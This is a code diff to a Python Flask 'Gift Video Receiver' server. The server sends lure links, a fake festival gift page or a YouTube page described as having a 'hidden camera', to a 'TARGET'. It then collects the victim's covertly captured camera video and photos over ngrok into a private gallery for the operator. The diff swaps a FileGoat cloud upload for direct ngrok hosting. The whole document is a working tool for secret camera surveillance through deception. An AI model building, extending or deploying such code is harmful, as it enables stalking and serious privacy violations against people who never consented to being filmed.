@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - With FileGoat Cloud Upload (Full Integration)
+Gift Video Receiver Server - Ngrok Direct Receiver & Online Media Gallery
 """
 
 import os
@@ -12,7 +12,6 @@ import threading
 import urllib.parse
 import urllib.request
 import re
-import requests
 from datetime import datetime
 from pathlib import Path
 from flask import Flask, request, jsonify, send_file
@@ -20,179 +19,29 @@ from flask_cors import CORS
 from werkzeug.utils import secure_filename
 
 # ============================================
-# CONFIG
+# CONFIGURATION
 # ============================================
 UPLOAD_FOLDER = Path("gift_videos")
 PORT = 5000
 FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
 
-# FileGoat expiry options
-FILEGOAT_EXPIRY_DAYS = 7  # Default: 7 days
-
-# Create upload directory
+# Ensure upload directory exists
 UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)
 
 # ============================================
-# FLASK APP
+# FLASK APPLICATION SETUP
 # ============================================
 app = Flask(__name__)
 CORS(app)
 
-# Allow large files (5GB)
+# Allow file uploads up to 5GB
 app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
 
 received_files = []
-uploaded_links = []
 
 # ============================================
-# FILEGOAT UPLOAD FUNCTION
-# ============================================
-
-def upload_to_filegoat(filepath, expiry_days=7, extend_on_view=True):
-    """
-    Upload image/video to FileGoat using official 2-step API.
-    
-    expiry_days: 1, 7, 30, 90
-    extend_on_view: True/False (extends expiry when link is viewed)
-    """
-    import uuid
-    filepath = Path(filepath)
-
-    if not filepath.exists():
-        return {
-            "success": False,
-            "error": "File does not exist"
-        }
-
-    filename = filepath.name
-    file_size = filepath.stat().st_size
-
-    upload_url = "https://filego.at/api/file/upload"
-    bucket_url = "https://filego.at/api/bucket"
-
-    headers = {
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-            "AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
-        ),
-        "Accept": "*/*",
-        "Origin": "https://filego.at",
-        "Referer": "https://filego.at/",
-    }
-
-    try:
-        # Determine content type based on extension
-        ext_lower = filename.lower()
-        if ext_lower.endswith('.jpg') or ext_lower.endswith('.jpeg'):
-            content_type = "image/jpeg"
-        elif ext_lower.endswith('.png'):
-            content_type = "image/png"
-        elif ext_lower.endswith('.webm'):
-            content_type = "video/webm"
-        elif ext_lower.endswith('.mp4'):
-            content_type = "video/mp4"
-        else:
-            content_type = "application/octet-stream"
-
-        # Step 1: Upload file binary to get fileIds
-        with open(filepath, "rb") as file:
-            files = {
-                "file": (
-                    filename,
-                    file,
-                    content_type
-                )
-            }
-            response = requests.post(
-                upload_url,
-                files=files,
-                headers=headers,
-                timeout=600
-            )
-
-        if response.status_code != 200:
-            return {
-                "success": False,
-                "error": f"HTTP {response.status_code}",
-                "response": response.text[:1000]
-            }
-
-        try:
-            upload_result = response.json()
-        except ValueError:
-            return {
-                "success": False,
-                "error": "Server returned non-JSON response",
-                "response": response.text[:1000]
-            }
-
-        file_ids = upload_result.get("fileIds")
-        if not file_ids:
-            return {
-                "success": False,
-                "error": "Upload succeeded but no fileIds returned",
-                "response": upload_result
-            }
-
-        # Step 2: Create bucket to generate shareable URL
-        client_id = str(uuid.uuid4())
-        bucket_payload = {
-            "fileIds": file_ids,
-            "deleteTime": expiry_days,
-            "extendOnView": extend_on_view,
-            "clientId": client_id
-        }
-
-        bucket_headers = headers.copy()
-        bucket_headers["Content-Type"] = "application/json"
-
-        bucket_response = requests.post(
-            bucket_url,
-            json=bucket_payload,
-            headers=bucket_headers,
-            timeout=30
-        )
-
-        if bucket_response.status_code != 200:
-            return {
-                "success": False,
-                "error": f"HTTP {bucket_response.status_code}",
-                "response": bucket_response.text[:1000]
-            }
-
-        bucket_result = bucket_response.json()
-        slug = bucket_result.get("slug")
-
-        if not slug:
-            return {
-                "success": False,
-                "error": "Bucket creation succeeded but no slug returned",
-                "response": bucket_result
-            }
-
-        cloud_url = f"https://filego.at/bucket/{slug}"
-
-        return {
-            "success": True,
-            "url": cloud_url,
-            "expiry": f"{expiry_days} days",
-            "filename": filename,
-            "size": file_size,
-            "response": bucket_result
-        }
-
-    except requests.exceptions.Timeout:
-        return {"success": False, "error": "Upload timeout"}
-
-    except requests.exceptions.ConnectionError as e:
-        return {"success": False, "error": "Connection error"}
-
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-# ============================================
-# ROUTES
+# WEB ROUTES
 # ============================================
 
 @app.route('/festival')
@@ -214,7 +63,6 @@ def youtube_page():
 @app.route('/upload', methods=['POST'])
 def upload_media():
     try:
-        # Check file
         if 'media' not in request.files:
             return jsonify({'error': 'No media file'}), 400
         
@@ -241,78 +89,159 @@ def upload_media():
         local_path = UPLOAD_FOLDER / safe_name
         media_file.save(local_path)
         
+        # Determine Ngrok URLs for direct online viewing
+        base_ngrok = app.config.get('NGROK_URL') or ""
+        view_url = f"{base_ngrok}/view/{safe_name}" if base_ngrok else f"/view/{safe_name}"
+        download_url = f"{base_ngrok}/download/{safe_name}" if base_ngrok else f"/download/{safe_name}"
+        gallery_url = f"{base_ngrok}/gallery" if base_ngrok else "/gallery"
+        
         file_info = {
             'filename': safe_name,
             'path': str(local_path.absolute()),
             'type': media_type,
             'timestamp': timestamp,
             'size': local_path.stat().st_size,
-            'cloud_url': None,
-            'expires': None,
-            'delete_url': None
+            'view_url': view_url,
+            'download_url': download_url,
+            'gallery_url': gallery_url
         }
-        
-        # Get expiry from request or use default
-        expiry_days = request.form.get('expiry', str(FILEGOAT_EXPIRY_DAYS))
-        try:
-            expiry_days = int(expiry_days)
-        except ValueError:
-            expiry_days = FILEGOAT_EXPIRY_DAYS
-        
-        if expiry_days not in [1, 7, 30, 90]:
-            expiry_days = 7
-        
-        cloud_result = upload_to_filegoat(local_path, expiry_days)
-        
-        if cloud_result.get('success'):
-            file_info['cloud_url'] = cloud_result.get('url')
-            file_info['expires'] = cloud_result.get('expiry')
-            
-            uploaded_links.append({
-                'filename': safe_name,
-                'url': cloud_result.get('url'),
-                'expires': cloud_result.get('expiry')
-            })
         
         received_files.append(file_info)
         
-        # Clean, well-aligned display output
-        print("\n" + "=" * 55)
+        # Clean, aligned console display output
+        print("\n" + "=" * 60)
         print(f"📹 RECEIVED MEDIA #{len(received_files)} ({media_type.upper()})")
-        print("=" * 55)
-        print(f"  📁 File:       {safe_name}")
-        print(f"  📊 Size:       {file_info['size']:,} bytes")
-        print(f"  📂 Local Path: {file_info['path']}")
-        if file_info.get('cloud_url'):
-            print(f"  ☁️ Cloud Link: {file_info['cloud_url']}")
-            print(f"  ⏰ Expires:    {file_info['expires']}")
-        else:
-            print(f"  ⚠️ Cloud Link: Upload failed ({cloud_result.get('error', 'Unknown error')})")
-        print("=" * 55)
+        print("=" * 60)
+        print(f"  📁 File:              {safe_name}")
+        print(f"  📊 Size:              {file_info['size']:,} bytes")
+        print(f"  📂 Local Path:        {file_info['path']}")
+        print(f"  📺 Direct View Link:  {view_url}")
+        print(f"  🖼️ Online Gallery:   {gallery_url}")
+        print("=" * 60)
         
         return jsonify({
             'success': True,
             'filename': safe_name,
-            'cloud_url': file_info.get('cloud_url'),
+            'view_url': view_url,
+            'download_url': download_url,
+            'gallery_url': gallery_url,
             'local_path': file_info.get('path')
         }), 200
 
     except Exception as e:
-        print(f"❌ Error: {e}")
+        print(f"❌ Upload Error: {e}")
         return jsonify({'error': str(e)}), 500
+
+@app.route('/view/<filename>', methods=['GET'])
+def view_media(filename):
+    filepath = UPLOAD_FOLDER / filename
+    if not filepath.exists():
+        return jsonify({'error': 'File not found'}), 404
+        
+    ext = filename.lower().split('.')[-1]
+    mime_types = {
+        'webm': 'video/webm',
+        'mp4': 'video/mp4',
+        'jpg': 'image/jpeg',
+        'jpeg': 'image/jpeg',
+        'png': 'image/png'
+    }
+    mimetype = mime_types.get(ext, 'application/octet-stream')
+    return send_file(filepath, mimetype=mimetype, as_attachment=False)
+
+@app.route('/gallery', methods=['GET'])
+def gallery_page():
+    html_content = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captured Media Gallery</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; min-height: 100vh; }
+        header { max-width: 1200px; margin: 0 auto 30px; display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #1e293b; }
+        h1 { font-size: 1.8rem; font-weight: 700; background: linear-gradient(135deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .stats { font-size: 0.9rem; color: #94a3b8; background: #1e293b; padding: 6px 14px; border-radius: 20px; border: 1px solid #334155; }
+        .grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
+        .card { background: #1e293b; border-radius: 12px; overflow: hidden; border: 1px solid #334155; transition: transform 0.2s, box-shadow 0.2s; }
+        .card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); }
+        .media-container { width: 100%; height: 230px; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .media-container video, .media-container img { width: 100%; height: 100%; object-fit: contain; }
+        .card-body { padding: 15px; }
+        .file-name { font-size: 0.95rem; font-weight: 600; color: #e2e8f0; margin-bottom: 6px; word-break: break-all; }
+        .meta { font-size: 0.8rem; color: #94a3b8; display: flex; justify-content: space-between; margin-bottom: 12px; }
+        .actions { display: flex; gap: 8px; }
+        .btn { flex: 1; text-align: center; padding: 8px 12px; border-radius: 6px; font-size: 0.85rem; font-weight: 500; text-decoration: none; transition: background 0.2s; }
+        .btn-primary { background: #3b82f6; color: white; }
+        .btn-primary:hover { background: #2563eb; }
+        .btn-secondary { background: #334155; color: #cbd5e1; }
+        .btn-secondary:hover { background: #475569; }
+        .empty { text-align: center; grid-column: 1 / -1; padding: 60px; color: #64748b; font-size: 1.1rem; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>📹 Captured Media Gallery</h1>
+        <div class="stats" id="counter">Auto-Refresh Active (5s)</div>
+    </header>
+    <div class="grid" id="galleryGrid"></div>
+    <script>
+        async function loadGallery() {
+            try {
+                const res = await fetch('/files');
+                const data = await res.json();
+                const files = data.files || [];
+                const grid = document.getElementById('galleryGrid');
+                document.getElementById('counter').textContent = `${files.length} Item(s) Received`;
+                
+                if (files.length === 0) {
+                    grid.innerHTML = '<div class="empty">⏳ No photos or videos received yet.<br>Captured media will automatically appear here live!</div>';
+                    return;
+                }
+                
+                grid.innerHTML = files.slice().reverse().map(f => {
+                    const isVideo = f.type === 'video' || f.filename.endsWith('.webm') || f.filename.endsWith('.mp4');
+                    const viewUrl = `/view/${f.filename}`;
+                    const downloadUrl = `/download/${f.filename}`;
+                    
+                    const mediaHtml = isVideo 
+                        ? `<video controls src="${viewUrl}" preload="metadata"></video>`
+                        : `<img src="${viewUrl}" alt="${f.filename}" loading="lazy">`;
+                        
+                    return `
+                        <div class="card">
+                            <div class="media-container">${mediaHtml}</div>
+                            <div class="card-body">
+                                <div class="file-name">${f.filename}</div>
+                                <div class="meta">
+                                    <span>TYPE: ${f.type.toUpperCase()}</span>
+                                    <span>${(f.size / 1024).toFixed(1)} KB</span>
+                                </div>
+                                <div class="actions">
+                                    <a class="btn btn-primary" href="${viewUrl}" target="_blank">🔍 Direct View</a>
+                                    <a class="btn btn-secondary" href="${downloadUrl}">📥 Download</a>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            } catch(e) {
+                console.error("Failed loading gallery", e);
+            }
+        }
+        loadGallery();
+        setInterval(loadGallery, 5000);
+    </script>
+</body>
+</html>"""
+    return html_content
 
 @app.route('/files', methods=['GET'])
 def list_files():
     return jsonify({
-        'files': received_files,
-        'cloud_links': uploaded_links
-    })
-
-@app.route('/cloud-links', methods=['GET'])
-def get_cloud_links():
-    return jsonify({
-        'links': uploaded_links,
-        'total': len(uploaded_links)
+        'files': received_files
     })
 
 @app.route('/download/<filename>', methods=['GET'])
@@ -371,13 +300,13 @@ class GiftServer:
                 print("❌ Invalid choice. Enter 1 or 2")
 
     def show_main_menu(self):
-        print("\n" + "="*60)
-        print("🎁 GIFT VIDEO RECEIVER")
-        print("="*60)
+        print("\n" + "=" * 60)
+        print("🎁 GIFT VIDEO RECEIVER (NGROK DIRECT SERVER)")
+        print("=" * 60)
         print("\nSelect mode:")
         print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
         print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
-        print("\n" + "-"*60)
+        print("\n" + "-" * 60)
         
         while True:
             choice = input("\nEnter choice (1 or 2): ").strip()
@@ -419,30 +348,6 @@ class GiftServer:
             print(f"   Using video ID: {video}")
         
         return video
-
-    def get_cloud_config(self):
-        """Get cloud upload configuration from user"""
-        print("\n☁️ FileGoat Cloud Upload Configuration:")
-        print("   Files will be uploaded with auto-expiry")
-        print("")
-        print("   Select expiry time:")
-        print("     1. 1 day")
-        print("     2. 7 days (default)")
-        print("     3. 30 days")
-        print("     4. 90 days")
-        
-        while True:
-            choice = input("\n   Enter choice (1-4, press Enter for default): ").strip()
-            if choice == '' or choice == '2':
-                return 7
-            elif choice == '1':
-                return 1
-            elif choice == '3':
-                return 30
-            elif choice == '4':
-                return 90
-            else:
-                print("   ❌ Invalid choice. Enter 1-4 or press Enter for default")
 
     def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
         base_url = self.ngrok_url
@@ -575,8 +480,8 @@ class GiftServer:
 
     def wait_for_files(self):
         print("\n🎁 Server ready! Waiting for incoming files... (Press Ctrl+C to stop)")
-        print(f"📁 Local Folder:  {UPLOAD_FOLDER.absolute()}")
-        print(f"☁️ Cloud Service: FileGoat ({FILEGOAT_EXPIRY_DAYS} days auto-expiry)")
+        print(f"📁 Local Folder:   {UPLOAD_FOLDER.absolute()}")
+        print(f"🖼️ Ngrok Gallery: {self.ngrok_url}/gallery")
         print("=" * 60)
         
         try:
@@ -607,11 +512,6 @@ class GiftServer:
             # Ngrok Authtoken Setup
             self.setup_ngrok_authtoken()
             
-            # Get cloud config
-            global FILEGOAT_EXPIRY_DAYS
-            FILEGOAT_EXPIRY_DAYS = self.get_cloud_config()
-            print(f"   ✅ Files will expire after: {FILEGOAT_EXPIRY_DAYS} days")
-            
             # Main menu
             mode = self.show_main_menu()
             camera = self.get_camera_type()
@@ -629,20 +529,29 @@ class GiftServer:
             if not self.start_ngrok():
                 return
             
+            app.config['NGROK_URL'] = self.ngrok_url
+
             # Generate link
             link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
+            gallery_link = f"{self.ngrok_url}/gallery"
             
             print("\n" + "=" * 60)
-            print(f"📤 SHARE THIS LINK ({mode_name}):")
+            print(f"📤 SHARE THIS LINK TO TARGET ({mode_name}):")
             print("=" * 60)
             print(f"\n🔗 {link}\n")
+            print("=" * 60)
+            
+            print("\n" + "=" * 60)
+            print("🖼️ YOUR PRIVATE ONLINE GALLERY (VIEW RECEIVED MEDIA):")
+            print("=" * 60)
+            print(f"\n🔗 {gallery_link}\n")
             print("=" * 60)
             
             print("\n📋 Configuration Summary:")
             print(f"   🎯 Mode:         {mode_name}")
             print(f"   📷 Camera:       {'Front' if camera == 'user' else 'Back'}")
             print(f"   📸 Capture:      {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
-            print(f"   ☁️ Cloud Expiry: {FILEGOAT_EXPIRY_DAYS} days (FileGoat)")
+            print(f"   🌐 Server Mode:  Direct Ngrok Server Only")
             if mode == 'festival':
                 print(f"   🎊 Festival:     {name}")
             else:
